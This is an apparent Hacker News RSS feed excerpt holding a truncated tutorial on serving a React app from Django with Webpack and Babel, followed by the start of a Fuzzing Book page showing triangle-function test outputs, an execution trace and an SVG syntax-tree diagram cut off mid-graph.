<li><a href="https://github.com/MattSegal/django-react-guide/tree/part-2-add-webpack">Adding Webpack</a></li>
<li><a href="https://github.com/MattSegal/django-react-guide/tree/part-3-add-babel-and-react">Adding Babel and React</a></li>
</ul>
<p>Before you start the rest of the guide, I recommend setting up the example project by cloning the repo and following the instructions in the <a href="https://github.com/MattSegal/django-react-guide/blob/part-1-initial-django/README.md">README</a>:</p>
<div><pre><span></span><code>git clone https://github.com/MattSegal/django-react-guide.git
</code></pre></div>

<h2>Django and static files</h2>
<p>Before we dig into React, Babel and Webpack, I want to make sure that we have a common understanding around how static files work in Django:</p>
<p><img alt="views and static files" src="https://mattsegal.dev/views-static.png"></p>
<p>The approach of this guide will be to re-use a lot of this existing setup. We will create an additional that system inserts our React app's JavaScript into a Django static files folder.</p>
<p><img alt="views and static files plus mystery system" src="https://mattsegal.dev/views-static-mystery.png"></p>
<h2>Why can't we just write React in a single static file?</h2>
<p>Why do we need to add a new system? Django is pretty complicated already. Can't we just write our React app in a single JavaScript file like you usually do when writing JavaScript for webpages? The answer is yes, you totally can! You can write a complete React app in a single HTML file:</p>
<div><pre><span></span><code><span>&lt;</span><span>html</span><span>&gt;</span>
<span>&lt;</span><span>body</span><span>&gt;</span>
  <span>&lt;!-- React mount point --&gt;</span>
  <span>&lt;</span><span>div</span> <span>id</span><span>=</span><span>"app"</span><span>&gt;&lt;/</span><span>div</span><span>&gt;</span>
  <span>&lt;!-- Download React library scripts --&gt;</span>
  <span>&lt;</span><span>script</span> <span>crossorigin</span> <span>src</span><span>=</span><span>"https://unpkg.com/<a href="https://mattsegal.dev/cdn-cgi/l/email-protection" data-cfemail="344651555740740502">[email&nbsp;protected]</a>/umd/react.development.js"</span><span>&gt;&lt;/</span><span>script</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>crossorigin</span> <span>src</span><span>=</span><span>"https://unpkg.com/<a href="https://mattsegal.dev/cdn-cgi/l/email-protection" data-cfemail="186a7d797b6c357c777558292e">[email&nbsp;protected]</a>/umd/react-dom.development.js"</span><span>&gt;&lt;/</span><span>script</span><span>&gt;</span>
  <span>&lt;</span><span>script</span><span>&gt;</span>
    <span>// Define the React app</span>
    <span>const</span> <span>App</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>{</span>
      <span>const</span> <span>[</span><span>count</span><span>,</span> <span>setCount</span><span>]</span> <span>=</span> <span>React</span><span>.</span><span>useState</span><span>(</span><span>0</span><span>)</span>
      <span>const</span> <span>onClick</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>setCount</span><span>(</span><span>c</span> <span>=&gt;</span> <span>c</span> <span>+</span> <span>1</span><span>)</span>
      <span>return</span> <span>React</span><span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>,</span> <span>null</span><span>,</span>
        <span>React</span><span>.</span><span>createElement</span><span>(</span><span>'h1'</span><span>,</span> <span>null</span><span>,</span> <span>'The count is '</span> <span>+</span> <span>count</span><span>),</span>
        <span>React</span><span>.</span><span>createElement</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onClick</span><span>:</span> <span>onClick</span> <span>},</span> <span>'Count'</span><span>),</span>
      <span>)</span>
    <span>}</span>
    <span>// Mount the app to the mount point.</span>
    <span>const</span> <span>root</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'app'</span><span>)</span>
    <span>ReactDOM</span><span>.</span><span>render</span><span>(</span><span>React</span><span>.</span><span>createElement</span><span>(</span><span>App</span><span>,</span> <span>null</span><span>,</span> <span>null</span><span>),</span> <span>root</span><span>)</span>
  <span>&lt;/</span><span>script</span><span>&gt;</span>
<span>&lt;/</span><span>body</span><span>&gt;</span>
<span>&lt;/</span><span>html</span><span>&gt;</span>
</code></pre></div>
<p>Why don't we just do this? There are a few issues with this approach of writing React apps:</p>
<ul>
<li>We can't use <a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a> syntax in our JavaScript</li>
<li>It's harder to break our JavaScript code up into modules</li>
<li>It's harder to install/use external libraries</li>
</ul>

<h2>Webpack</h2>
<p>The example code for this section <a href="https://github.com/MattSegal/django-react-guide/tree/part-1-initial-django">starts here</a> and <a href="https://github.com/MattSegal/django-react-guide/tree/part-2-add-webpack">ends here</a>.</p>
<p>We need a tool that helps us use JSX, and it would be nice to also have a "module bundling system" which lets us install 3rd party libraries and split our JavaScript code up into lots of little files. For this purpose, we're going to use <a href="https://webpack.js.org/">Webpack</a>. Webpack is going to take our code, plus any 3rd party libraries that we want to install and combine them into a single JS file.</p>
<p><img alt="webpack" src="https://mattsegal.dev/webpack.png"></p>
<p>In this step we will just to create a minimal working Webpack setup. We're not goint try to use React yet. By the end of this section, we won't have added any new JavaScript features, but Webpack will be working.</p>
<p>To use Webpack you need to first install <a href="https://nodejs.org/en/">NodeJS</a> so that you can run JavaScript outside of your web browser. You need to be able to run <code>node</code> and <code>npm</code> (the Node Package Manager) before you can continue.</p>
<p>First, go into the example project and create a new folder called <code>frontend</code>.
We'll start by just copying over the existing JavaScript that is used by the Django app in <a href="https://github.com/MattSegal/django-react-guide/blob/part-1-initial-django/backend/todos/static/todos/main.js">main.js</a>. We're going to copy this into a "source code" folder at <code>frontend/src/index.js</code>.</p>
<div><pre><span></span><code><span>// frontend/src/index.js</span>
<span>const</span> <span>btn</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'click'</span><span>)</span>
<span>btn</span><span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>alert</span><span>(</span><span>'You clicked the button!'</span><span>))</span>
</code></pre></div>
<p>Inside of the <code>frontend</code> folder, install Webpack using <code>npm</code> as follows:</p>
<div><pre><span></span><code>npm init --yes
npm install webpack webpack-cli
</code></pre></div>
<p>Now is a good time to update your <code>.gitignore</code> file to exclude <code>node_modules</code>. Next, we need to add a file that tells Webpack what to do, which is called <code>webpack.config.js</code></p>
<div><pre><span></span><code><span>// frontend/webpack.config.js</span>
<span>const</span> <span>path</span> <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>
<span>const</span> <span>webpack</span> <span>=</span> <span>require</span><span>(</span><span>'webpack'</span><span>)</span>
<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>{</span>
  <span>// Where Webpack looks to load your JavaScript</span>
  <span>entry</span><span>:</span> <span>{</span>
    <span>main</span><span>:</span> <span>path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span> <span>'src/index.js'</span><span>),</span>
  <span>},</span>
  <span>mode</span><span>:</span> <span>'development'</span><span>,</span>
  <span>// Where Webpack spits out the results (the myapp static folder)</span>
  <span>output</span><span>:</span> <span>{</span>
    <span>path</span><span>:</span> <span>path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span> <span>'../backend/myapp/static/myapp/'</span><span>),</span>
    <span>filename</span><span>:</span> <span>'[name].js'</span><span>,</span>
  <span>},</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>// Don't output new files if there is an error</span>
    <span>new</span> <span>webpack</span><span>.</span><span>NoEmitOnErrorsPlugin</span><span>(),</span>
  <span>],</span>
  <span>// Where find modules that can be imported (eg. React) </span>
  <span>resolve</span><span>:</span> <span>{</span>
    <span>extensions</span><span>:</span> <span>[</span><span>'*'</span><span>,</span> <span>'.js'</span><span>,</span> <span>'.jsx'</span><span>],</span>
    <span>modules</span><span>:</span> <span>[</span>
        <span>path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span> <span>'src'</span><span>),</span>
        <span>path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span> <span>'node_modules'</span><span>),</span>
    <span>],</span>
  <span>},</span>
<span>}</span>
</code></pre></div>
<p>Finally let's make it easy to run Webpack by including an entry in the "scripts" section of our <code>package.json</code> file:</p>
<div><pre><span></span><code><span>// frontend/package.json</span>
<span>{</span>
  <span>// ...</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"dev"</span><span>:</span> <span>"webpack --watch --config webpack.config.js"</span>
  <span>},</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div>
<p>The <code>--watch</code> flag is particularly useful: it makes Webpack re-run automatically on file change. Now we can run Webpack using <code>npm</code>:</p>

<p>You will now see that the contents of your <code>main.js</code> file has been replaced with a crazy looking <code>eval</code> statement. If you check your Django app at <code>http://localhost:8000</code> you'll see that the JavaScript on the page still works, but it's now using the Webpack build output at <code>http://localhost:8000/static/myapp/main.js</code> </p>
<div><pre><span></span><code><span>// backend/myapp/static/myapp/main.js</span>
<span>eval</span><span>(</span><span>"const btn = document.getElementById('click')\nbtn.addEventListener('click', () =&gt; alert('You clicked the button!'))\n\n\n//# sourceURL=webpack://frontend/./src/index.js?"</span><span>);</span>
</code></pre></div>
<p>This file is the Webpack build output. Webpack has taken our source file (<code>index.js</code>) and transformed it into an output file (<code>main.js</code>): </p>
<p><img alt="webpack minimal" src="https://mattsegal.dev/webpack-minimal.png"></p>
<p>So now we have Webpack working. It's not doing anything particularly useful or interesting yet, but all the plumbing has been set up.</p>

<h2>Source code vs. build outputs</h2>
<p>It's a common newbie mistake to add Webpack build outputs like <code>main.js</code> to source control. It's a mistake because source control is for "source code", not "build artifacts". A build artifact is a file created by a build or compliation process. The reason you don't add build artifacts is because they're redundant: they are fully defined by the source code, so adding them just bloats the repo without adding any extra information. Even worse, having a mismatch between source code and build artifacts can create nasty errors that are hard to find. Some examples of build artifacts:</p>
<ul>
<li>Python bytecode (.pyc) file,s which are built from .py files by the Python interpeter</li>
<li>.NET bytecode (.dll) files, built from compiling C# code</li>
<li>Executable (.exe) files, build from compiling C code</li>
</ul>
<p>None of these things should go in source control unless there's a special reason to keep them. In general they should be kept out of Git using the <code>.gitignore</code> file.</p>
<p>My approach for this project is to create a special Webpack-only folder in Django's static file called "build", which is ignored by Git.
To achieve this, you need to update your <code>webpack.config.js</code> file:</p>
<div><pre><span></span><code><span>// frontend/webpack.config.js</span>
<span>// ...</span>
<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>{</span>
  <span>// ...</span>
  <span>output</span><span>:</span> <span>{</span>
      <span>path</span><span>:</span> <span>path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span> <span>'../backend/myapp/static/myapp/build/'</span><span>),</span>
      <span>filename</span><span>:</span> <span>'[name].js'</span><span>,</span>
  <span>},</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div>
<p>You will need to restart Webpack for these changes to take effect. Then you can add <code>build/</code> to your <code>.gitignore</code> file.
Finally, you will need to update the static file link in your Django template:</p>
<div><pre><span></span><code><span>&lt;!-- backend/myapp/templates/myapp/index.html --&gt;</span>
<span>&lt;</span><span>script</span> <span>src</span><span>=</span><span>"{% static 'myapp/build/main.js' %}"</span><span>&gt;&lt;/</span><span>script</span><span>&gt;</span>
</code></pre></div>

<h2>Adding React</h2>
<p>The example code for this section <a href="https://github.com/MattSegal/django-react-guide/tree/part-2-add-webpack">starts here</a> and <a href="https://github.com/MattSegal/django-react-guide/tree/part-3-add-babel-and-react">ends here</a>.</p>
<p>Now that Webpack is working, we can add React. Let's start by installing React in our <code>frontend</code> folder:</p>
<div><pre><span></span><code>npm install react react-dom
</code></pre></div>
<p>Now we can use React in our JavaScript source code. Let's re-use the small counter app I created earlier:</p>
<div><pre><span></span><code><span>// frontend/src/index.js</span>
<span>import</span> <span>React</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>ReactDOM</span> <span>from</span> <span>'react-dom'</span>

<span>// Define the React app</span>
<span>const</span> <span>App</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>[</span><span>count</span><span>,</span> <span>setCount</span><span>]</span> <span>=</span> <span>React</span><span>.</span><span>useState</span><span>(</span><span>0</span><span>)</span>
  <span>const</span> <span>onClick</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>setCount</span><span>(</span><span>c</span> <span>=&gt;</span> <span>c</span> <span>+</span> <span>1</span><span>)</span>
  <span>return</span> <span>React</span><span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>,</span> <span>null</span><span>,</span>
    <span>React</span><span>.</span><span>createElement</span><span>(</span><span>'h1'</span><span>,</span> <span>null</span><span>,</span> <span>'The count is '</span> <span>+</span> <span>count</span><span>),</span>
    <span>React</span><span>.</span><span>createElement</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onClick</span><span>:</span> <span>onClick</span> <span>},</span> <span>'Count'</span><span>),</span>
  <span>)</span>
<span>}</span>
<span>// Mount the app to the mount point.</span>
<span>const</span> <span>root</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'app'</span><span>)</span>
<span>ReactDOM</span><span>.</span><span>render</span><span>(</span><span>React</span><span>.</span><span>createElement</span><span>(</span><span>App</span><span>,</span> <span>null</span><span>,</span> <span>null</span><span>),</span> <span>root</span><span>)</span>
</code></pre></div>
<p>Now if you go to <code>http://localhost:8000/</code> you should see a simple counter. If you ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mattsegal.dev/django-react.html">https://mattsegal.dev/django-react.html</a></em></p>]]>
            </description>
            <link>https://mattsegal.dev/django-react.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937453</guid>
            <pubDate>Thu, 29 Oct 2020 23:44:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Prototyping with Python ‚Äì The Fuzzing Book]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937438">thread link</a>) | @rbanffy
<br/>
October 29, 2020 | https://www.fuzzingbook.org/beta/html/PrototypingWithPython.html | <a href="https://web.archive.org/web/*/https://www.fuzzingbook.org/beta/html/PrototypingWithPython.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<pre>triangle(1, 6, 1) = 'isosceles #3'
triangle(2, 1, 3) = 'scalene'
triangle(1, 5, 8) = 'scalene'
triangle(3, 2, 7) = 'scalene'
triangle(2, 6, 3) = 'scalene'
triangle(7, 8, 6) = 'scalene'
triangle(5, 7, 7) = 'isosceles #2'
triangle(3, 8, 7) = 'scalene'
triangle(5, 1, 8) = 'scalene'
triangle(8, 4, 8) = 'isosceles #3'
</pre>
</div>

</div><div>

<div>
<pre>triangle:1 def triangle(a, b, c):                  (c = 1, b = 2, a = 2)
triangle:2     if a == b:                          (c = 1, b = 2, a = 2)
triangle:3         if b == c:                      (c = 1, b = 2, a = 2)
triangle:6             return 'isosceles #1'       (c = 1, b = 2, a = 2)
triangle:6             return 'isosceles #1'       (c = 1, b = 2, a = 2)
</pre>
</div>

</div><div>

<p>
<svg height="476pt" viewBox="0.00 0.00 1882.50 476.00" width="1883pt" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" transform="scale(1 1) rotate(0) translate(4 472)">
<title>%3</title>
<polygon fill="#ffffff" points="-4,4 -4,-472 1878.5,-472 1878.5,4 -4,4" stroke="transparent"></polygon>
<!-- 0 -->
<g id="node1">
<title>0</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="119" y="-447.3">FunctionDef</text>
</g>
<!-- 1 -->
<g id="node2">
<title>1</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="50.5" y="-374.3">"triangle"</text>
</g>
<!-- 0&#45;&#45;1 -->
<g id="edge1">
<title>0--1</title>
<path d="M166.5,-432C166.5,-432 123.1482,-411.819 89.449,-396.1314" fill="none" stroke="#000000"></path>
</g>
<!-- 2 -->
<g id="node3">
<title>2</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="127.5" y="-375.3">arguments</text>
</g>
<!-- 0&#45;&#45;2 -->
<g id="edge2">
<title>0--2</title>
<path d="M166.5,-432C166.5,-432 166.1287,-411.9478 165.8386,-396.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 9 -->
<g id="node10">
<title>9</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="481" y="-375.3">If</text>
</g>
<!-- 0&#45;&#45;9 -->
<g id="edge9">
<title>0--9</title>
<path d="M166.5,-432C166.5,-432 384.3686,-395.5762 462.2396,-382.5575" fill="none" stroke="#000000"></path>
</g>
<!-- 3 -->
<g id="node4">
<title>3</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="44.5" y="-303.3">arg</text>
</g>
<!-- 2&#45;&#45;3 -->
<g id="edge3">
<title>2--3</title>
<path d="M159.5,-360C159.5,-360 114.7843,-336.327 84.5663,-320.3292" fill="none" stroke="#000000"></path>
</g>
<!-- 5 -->
<g id="node6">
<title>5</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="116.5" y="-303.3">arg</text>
</g>
<!-- 2&#45;&#45;5 -->
<g id="edge5">
<title>2--5</title>
<path d="M159.5,-360C159.5,-360 148.3599,-339.9478 139.6566,-324.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 7 -->
<g id="node8">
<title>7</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="188.5" y="-303.3">arg</text>
</g>
<!-- 2&#45;&#45;7 -->
<g id="edge7">
<title>2--7</title>
<path d="M159.5,-360C159.5,-360 175.0962,-339.9478 187.2807,-324.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 4 -->
<g id="node5">
<title>4</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="57.5" y="-230.3">"a"</text>
</g>
<!-- 3&#45;&#45;4 -->
<g id="edge4">
<title>3--4</title>
<path d="M57.5,-287.8314C57.5,-277 57.5,-263.2876 57.5,-252.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 6 -->
<g id="node7">
<title>6</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="129.5" y="-230.3">"b"</text>
</g>
<!-- 5&#45;&#45;6 -->
<g id="edge6">
<title>5--6</title>
<path d="M129.5,-287.8314C129.5,-277 129.5,-263.2876 129.5,-252.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 8 -->
<g id="node9">
<title>8</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="201.5" y="-230.3">"c"</text>
</g>
<!-- 7&#45;&#45;8 -->
<g id="edge8">
<title>7--8</title>
<path d="M201.5,-287.8314C201.5,-277 201.5,-263.2876 201.5,-252.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 10 -->
<g id="node11">
<title>10</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="352" y="-303.3">Compare</text>
</g>
<!-- 9&#45;&#45;10 -->
<g id="edge10">
<title>9--10</title>
<path d="M507.5,-360C507.5,-360 456.4182,-338.1078 419.3042,-322.2018" fill="none" stroke="#000000"></path>
</g>
<!-- 18 -->
<g id="node19">
<title>18</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="643" y="-303.3">If</text>
</g>
<!-- 9&#45;&#45;18 -->
<g id="edge18">
<title>9--18</title>
<path d="M507.5,-360C507.5,-360 582.7014,-331.7995 624.4147,-316.157" fill="none" stroke="#000000"></path>
</g>
<!-- 33 -->
<g id="node34">
<title>33</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1219" y="-303.3">If</text>
</g>
<!-- 9&#45;&#45;33 -->
<g id="edge33">
<title>9--33</title>
<path d="M507.5,-360C507.5,-360 1068.6377,-317.9147 1200.1543,-308.0509" fill="none" stroke="#000000"></path>
</g>
<!-- 11 -->
<g id="node12">
<title>11</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="256.5" y="-231.3">Name</text>
</g>
<!-- 10&#45;&#45;11 -->
<g id="edge11">
<title>10--11</title>
<path d="M375.5,-288C375.5,-288 330.7843,-264.327 300.5663,-248.3292" fill="none" stroke="#000000"></path>
</g>
<!-- 14 -->
<g id="node15">
<title>14</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="345.5" y="-230.3">Eq</text>
</g>
<!-- 10&#45;&#45;14 -->
<g id="edge14">
<title>10--14</title>
<path d="M375.5,-288C375.5,-288 364.3599,-267.9478 355.6566,-252.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 15 -->
<g id="node16">
<title>15</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="400.5" y="-231.3">Name</text>
</g>
<!-- 10&#45;&#45;15 -->
<g id="edge15">
<title>10--15</title>
<path d="M375.5,-288C375.5,-288 391.0962,-267.9478 403.2807,-252.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 12 -->
<g id="node13">
<title>12</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="201.5" y="-158.3">"a"</text>
</g>
<!-- 11&#45;&#45;12 -->
<g id="edge12">
<title>11--12</title>
<path d="M265.5,-216C265.5,-216 241.7344,-195.9478 223.1675,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 13 -->
<g id="node14">
<title>13</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="273.5" y="-158.3">Load</text>
</g>
<!-- 11&#45;&#45;13 -->
<g id="edge13">
<title>11--13</title>
<path d="M265.5,-216C265.5,-216 268.4707,-195.9478 270.7916,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 16 -->
<g id="node17">
<title>16</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="345.5" y="-158.3">"b"</text>
</g>
<!-- 15&#45;&#45;16 -->
<g id="edge16">
<title>15--16</title>
<path d="M409.5,-216C409.5,-216 385.7344,-195.9478 367.1675,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 17 -->
<g id="node18">
<title>17</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="417.5" y="-158.3">Load</text>
</g>
<!-- 15&#45;&#45;17 -->
<g id="edge17">
<title>15--17</title>
<path d="M409.5,-216C409.5,-216 412.4707,-195.9478 414.7916,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 19 -->
<g id="node20">
<title>19</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="555" y="-231.3">Compare</text>
</g>
<!-- 18&#45;&#45;19 -->
<g id="edge19">
<title>18--19</title>
<path d="M657.5,-288C657.5,-288 630.3923,-267.9478 609.2145,-252.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 27 -->
<g id="node28">
<title>27</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="660" y="-231.3">Return</text>
</g>
<!-- 18&#45;&#45;27 -->
<g id="edge27">
<title>18--27</title>
<path d="M657.5,-288C657.5,-288 667.8975,-267.9478 676.0205,-252.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 30 -->
<g id="node31">
<title>30</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="799" y="-231.3">Return</text>
</g>
<!-- 18&#45;&#45;30 -->
<g id="edge30">
<title>18--30</title>
<path d="M657.5,-288C657.5,-288 741.9072,-260.7067 790.7051,-244.9277" fill="none" stroke="#000000"></path>
</g>
<!-- 20 -->
<g id="node21">
<title>20</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="472.5" y="-159.3">Name</text>
</g>
<!-- 19&#45;&#45;20 -->
<g id="edge20">
<title>19--20</title>
<path d="M580.5,-216C580.5,-216 543.6076,-194.1078 516.803,-178.2018" fill="none" stroke="#000000"></path>
</g>
<!-- 23 -->
<g id="node24">
<title>23</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="561.5" y="-158.3">Eq</text>
</g>
<!-- 19&#45;&#45;23 -->
<g id="edge23">
<title>19--23</title>
<path d="M580.5,-216C580.5,-216 573.4446,-195.9478 567.9325,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 24 -->
<g id="node25">
<title>24</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="616.5" y="-159.3">Name</text>
</g>
<!-- 19&#45;&#45;24 -->
<g id="edge24">
<title>19--24</title>
<path d="M580.5,-216C580.5,-216 600.1809,-195.9478 615.5566,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 21 -->
<g id="node22">
<title>21</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="417.5" y="-86.3">"b"</text>
</g>
<!-- 20&#45;&#45;21 -->
<g id="edge21">
<title>20--21</title>
<path d="M481.5,-144C481.5,-144 457.7344,-123.9478 439.1675,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 22 -->
<g id="node23">
<title>22</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="489.5" y="-86.3">Load</text>
</g>
<!-- 20&#45;&#45;22 -->
<g id="edge22">
<title>20--22</title>
<path d="M481.5,-144C481.5,-144 484.4707,-123.9478 486.7916,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 25 -->
<g id="node26">
<title>25</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="561.5" y="-86.3">"c"</text>
</g>
<!-- 24&#45;&#45;25 -->
<g id="edge25">
<title>24--25</title>
<path d="M625.5,-144C625.5,-144 601.7344,-123.9478 583.1675,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 26 -->
<g id="node27">
<title>26</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="633.5" y="-86.3">Load</text>
</g>
<!-- 24&#45;&#45;26 -->
<g id="edge26">
<title>24--26</title>
<path d="M625.5,-144C625.5,-144 628.4707,-123.9478 630.7916,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 28 -->
<g id="node29">
<title>28</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="717.5" y="-159.3">Str</text>
</g>
<!-- 27&#45;&#45;28 -->
<g id="edge28">
<title>27--28</title>
<path d="M696.8554,-215.8314C703.625,-205 712.1953,-191.2876 718.9917,-180.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 29 -->
<g id="node30">
<title>29</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="741.5" y="-86.3">"equilateral"</text>
</g>
<!-- 28&#45;&#45;29 -->
<g id="edge29">
<title>28--29</title>
<path d="M733.2758,-143.8314C734.9306,-133 737.0255,-119.2876 738.6869,-108.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 31 -->
<g id="node32">
<title>31</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="844.5" y="-159.3">Str</text>
</g>
<!-- 30&#45;&#45;31 -->
<g id="edge31">
<title>30--31</title>
<path d="M832.8273,-215.8314C837.7917,-205 844.0765,-191.2876 849.0606,-180.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 32 -->
<g id="node33">
<title>32</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="889.5" y="-86.3">"isosceles #1"</text>
</g>
<!-- 31&#45;&#45;32 -->
<g id="edge32">
<title>31--32</title>
<path d="M865.575,-143.8314C870.3889,-133 876.4833,-119.2876 881.3163,-108.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 34 -->
<g id="node35">
<title>34</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1135" y="-231.3">Compare</text>
</g>
<!-- 33&#45;&#45;34 -->
<g id="edge34">
<title>33--34</title>
<path d="M1236.5,-288C1236.5,-288 1209.7637,-267.9478 1188.8759,-252.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 42 -->
<g id="node43">
<title>42</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1247" y="-231.3">Return</text>
</g>
<!-- 33&#45;&#45;42 -->
<g id="edge42">
<title>33--42</title>
<path d="M1236.5,-288C1236.5,-288 1249.8682,-267.9478 1260.312,-252.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 45 -->
<g id="node46">
<title>45</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1585" y="-231.3">If</text>
</g>
<!-- 33&#45;&#45;45 -->
<g id="edge45">
<title>33--45</title>
<path d="M1236.5,-288C1236.5,-288 1483.0627,-250.7048 1566.374,-238.1031" fill="none" stroke="#000000"></path>
</g>
<!-- 35 -->
<g id="node36">
<title>35</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1056.5" y="-159.3">Name</text>
</g>
<!-- 34&#45;&#45;35 -->
<g id="edge35">
<title>34--35</title>
<path d="M1161.5,-216C1161.5,-216 1126.694,-194.6418 1100.8614,-178.7899" fill="none" stroke="#000000"></path>
</g>
<!-- 38 -->
<g id="node39">
<title>38</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1145.5" y="-158.3">Eq</text>
</g>
<!-- 34&#45;&#45;38 -->
<g id="edge38">
<title>34--38</title>
